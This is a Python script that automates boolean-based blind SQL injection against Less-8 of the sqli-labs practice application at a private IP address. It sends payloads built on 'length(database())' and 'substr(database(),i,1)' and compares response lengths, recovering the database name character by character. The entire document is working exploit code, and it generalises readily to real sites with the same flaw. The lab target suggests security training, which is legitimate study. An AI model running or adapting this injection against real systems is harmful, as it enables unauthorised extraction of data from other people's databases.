import requests
import string
url = 'http://10.10.10.139/sqli-labs/Less-8/'

normalHtmlLen = len(requests.get(url = url + "?id=1").text)

print("The len of HTML:" + str(normalHtmlLen))

dbNameLen = 0

while True:
    dbNameLen_url = url + "?id=1' and length(database())="+str(dbNameLen) + "--+"
    #print(dbNameLen_url)

    if len(requests.get(dbNameLen_url).text) == normalHtmlLen:
        print("The len of dbName:" + str(dbNameLen))
        break
    if dbNameLen == 30:
        print("Error!")
        break
    dbNameLen += 1

dbName = ""
for i in range(1,dbNameLen + 1):
    for j in string.ascii_lowercase:
        dbName_url = url+"?id=1' and substr(database(),"+str(i)+",1)='"+j+"'--+"
        #print(dbName_url)
        if len(requests.get(dbName_url).text) == normalHtmlLen:
            dbName += j
            print(dbName)
            break